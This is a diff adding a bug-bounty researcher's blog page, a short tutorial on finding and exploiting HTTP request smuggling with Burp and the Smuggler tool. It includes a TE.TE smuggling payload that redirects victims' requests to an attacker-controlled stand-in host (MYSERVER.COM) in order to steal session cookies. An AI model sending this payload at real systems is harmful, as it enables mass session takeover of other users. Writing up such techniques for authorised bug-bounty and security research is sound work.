@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+	<meta name="generator" content="Hugo 0.64.0" />
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Jane Doe ">
+<meta name="description" content="Bug Bounty Hunter - Security Researcher" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://marcelo321.github.io/" />
+
+
+    <title>
+        
+            Zonduu 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://zonduu.me/main.min.5dcefbf8102eb536dd3e2de53ffebfa58599ab2435c241a0db81728a5e015f2e.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://zonduu.me//apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://zonduu.me//favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://zonduu.me//favicon-16x16.png">
+    <link rel="manifest" href="https://zonduu.me//site.webmanifest">
+    <link rel="mask-icon" href="https://zonduu.me//safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://zonduu.me//favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+<meta itemprop="name" content="Zonduu">
+<meta itemprop="description" content=""><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Zonduu"/>
+<meta name="twitter:description" content=""/>
+
+
+
+
+
+
+
+<link rel="alternate" type="application/rss+xml" href="https://marcelo321.github.io/index.xml" title="Zonduu" />
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://zonduu.me/" style="text-decoration: none;">
+    <div class="logo"> <!-- changing #fe5186 for #4db020 -->
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">root@localhost:~#</span>
+            <span class="logo__cursor" style=""></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://marcelo321.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+              <!--<span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>-->
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+		    
+
+		    
+		    
+    <main aria-role="main">
+        <div>
+            <h1>Finding and Exploiting HTTP Smuggling</h1>
+ 
+    </main>
+
+
+
+</footer>
+
+<div>
+          <p></p><p><u>Clarification</u>: I'm not an expert in finding and exploiting HTTP Smuggling but I will share how I <br>usually find them and the steps I make to exploit them.</p>
+</div>
+
+<div>
+<h3>How to find them?</h3>
+</div>
+
+<div>
+<p>
+Basically there are 2 main ways of finding HTTP Smuggling vulnerabilities. Using the <a href='https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646'>burp extension</a><br> or using the @defparam tool (also public) on github
+called <a href='https://github.com/defparam/smuggler'> Smuggler.</a></p>
+Not to mention you can also build your own tool to detect them but I recommend you to try those<br>
+first.
+
+<p>Both tools give you alerts when a <u>possible</u> HTTP Smuggling case appears, this means that after<br> you receive one, you need to check if it is a false positive or valid case.</p>
+
+</div>
+<div>
+<h2>How to exploit them?</h2></div>
+<p>
+Ok let's say that you managed to find a valid case of http smuggling using either the burp built-in<br> option to check for CLTE or TECL or the script from @defparam in turbo intruder, now what?<br>
+</p>
+
+<p>Well now you need to check if it is an <u>Open Desync</u> or <u>Self Desync</u>. Basically if it affects just your IP<br> or if it can affect other IPs/connections (like XSS and self-XSS).</p>
+
+<p> The first thing I check is if I can redirect to another domain or not, because if you can, then you can <br> usually escalate the issue pretty fast by stealing the victim's cookies.<br>
+
+<p>
+
+
+<pre><code>Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+19
+f
+on085=x&bcf5i=x
+0
+
+
+0
+
+GET https://MYSERVER.COM HTTP/1.1
+X-Ignore: X
+</code></pre>
+<p>
+
+</div>
+
+But if you can't, because you get an error or whatever, there are other options like DoS, or triggering<br> a harmful request on the victim's account, etc. A must read is <a href='https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn'>Albinowax's guide</a></p>
+
+<p>If you are in a stage environment like I was, then this step is a bit hard, because you need <br>to generate traffic from other IP. You can use 2 machines, one smuggles the requests and the<br>
+other one (with other IP) tries to get smuggled. I used an online page that takes screenshots <br>of the url you give, which makes keep-alive requests and are possible to smuggle.</p>
+
+<p>Now if you aren't in a stage environment, and you are able to redirect to other domain, then this step<br> isn't hard at all. You need to point it to burp collaborator or any server you want and check if you<br>
+receive a connection from a different IP that you have. Also most of them time this would be considered<br> critical since if you redirect to another domain (and isn't a code 300-399 redirect), then you would be<br>
+able to steal the cookies, achieving massive Session Takeover.</p>
+
+<p>A good example of this scenario is shown in this amazing report: <a href='https://hackerone.com/reports/737140'>#737140</a> where @defparam was<br> able to leak the session cookie, leading to mass session takeover of the users affected.
+
+
+
+
+</div>
+</div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://zonduu.me/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js"></script>
+
+
+    </body>
+<!-- <img src="http://elasticbeanstalk-us-west-1-057160389187.s3.amazonaws.com/">
+<script src='http://s3b.d.ad.ucketqueexiste.s3.amazonaws.com/ads'>
+
+https://s.aolcdn.com/images/dims?image_uri=https%3A%2F%2Flt-external-widgets.s3.amazonaws.com
+https:\u002F\u002Fmedia-mbst-pub-ue1.s3.
+-->
+</html>
